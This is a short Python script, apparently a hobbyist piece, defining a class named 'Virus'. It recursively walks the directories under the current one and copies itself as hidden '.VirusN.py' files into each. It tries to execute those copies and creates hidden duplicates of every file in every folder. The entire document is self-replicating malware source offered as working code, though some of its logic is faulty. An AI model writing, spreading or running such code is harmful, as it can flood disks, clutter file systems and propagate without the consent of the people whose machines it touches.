import os
import shutil
import random

class Virus:
    def __init__(self,path=None,target_dir=None,repeat=None):
        self.path=path
        self.target_dir=[]
        self.repeat=True
        self.repeat=2
        self.own_path = os.path.realpath(__file__)

    def list_mydir(self,path):
        self.target_dir.append(path)
        current_dir=os.listdir(path)

        for file in current_dir:
            if not file.startswith("."):
                absolute_path=os.path.join(path,file)
                print("what is absolute path  " , absolute_path)

                if os.path.isdir(absolute_path):
                    self.list_mydir(absolute_path)
                else:
                    pass    
    

    def new_virus(self):
        for directory in self.target_dir:
            n=random.randint(0,10)
            newpath=".Virus"+str(n)+".py"
            destination=os.path.join(directory,newpath)
            shutil.copyfile(self.own_path,destination)
            os.system(newpath+" 1")

    def replicate(self):
        for directory in self.target_dir:
            fileListDir=os.listdir(directory)
            
            for file in fileListDir:
                absolute_path=os.path.join(directory,file)
                if not absolute_path.startswith(".") and not os.path.isdir(absolute_path):
                    source=absolute_path
                    for i in range(self.repeat):
                        destination=os.path.join(directory,("."+file+str(i)))
                        print("what is destinations path  ",destination)
                        shutil.copyfile(source,destination)


    def Virus_action(self):
        self.list_mydir(self.path)
        print("what is targeted_dir ", self.target_dir)
        self.new_virus()
        self.replicate()

if __name__=="__main__":
    current_dir=os.path.abspath("")
    Myvirus=Virus(path=current_dir)
    Myvirus.Virus_action()
